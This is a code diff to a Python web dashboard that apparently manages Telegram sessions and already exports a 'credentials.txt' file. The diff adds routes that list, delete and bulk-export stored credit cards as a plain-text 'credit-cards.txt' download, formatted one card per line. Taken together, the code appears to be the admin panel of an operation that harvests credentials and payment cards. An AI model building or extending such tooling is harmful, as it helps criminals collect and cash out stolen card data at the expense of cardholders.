@@ -24,6 +24,7 @@ from telethon.errors import (
     SessionPasswordNeededError,
 )
 from secure_logging import recent_activity_logs
+from parse_credit_cards import format_credit_card_line
 
 LOG = logging.getLogger('dashboard')
 SESSION_MAX_AGE = 12 * 60 * 60
@@ -552,6 +553,32 @@ class Dashboard:
             content = '\n'.join(lines) + '\n' if lines else ''
             return Response(content, media_type='text/plain',
                             headers={'Content-Disposition': 'attachment; filename=credentials.txt'})
+
+        @self.app.get('/credit-cards')
+        async def get_credit_cards(request: Request):
+            self._require(request)
+            cards = await asyncio.to_thread(self.db.get_all_credit_cards)
+            for card in cards:
+                card['line'] = format_credit_card_line(card)
+            return cards
+
+        @self.app.post('/credit-cards/clear-all')
+        async def clear_credit_cards(request: Request, csrf: str = Form(...)):
+            self._require_post(request, csrf)
+            count = await asyncio.to_thread(self.db.clear_all_credit_cards)
+            return RedirectResponse(f'/?notice=Deleted+{count}+credit+cards', 303)
+
+        @self.app.get('/credit-cards/export')
+        async def export_credit_cards(request: Request):
+            self._require(request)
+            cards = await asyncio.to_thread(self.db.get_all_credit_cards)
+            lines = [format_credit_card_line(card) for card in cards]
+            content = '\n'.join(lines) + '\n' if lines else ''
+            return Response(
+                content,
+                media_type='text/plain',
+                headers={'Content-Disposition': 'attachment; filename=credit-cards.txt'},
+            )
 
         @self.app.get('/session-regenerate')
         async def session_regenerate(request: Request):
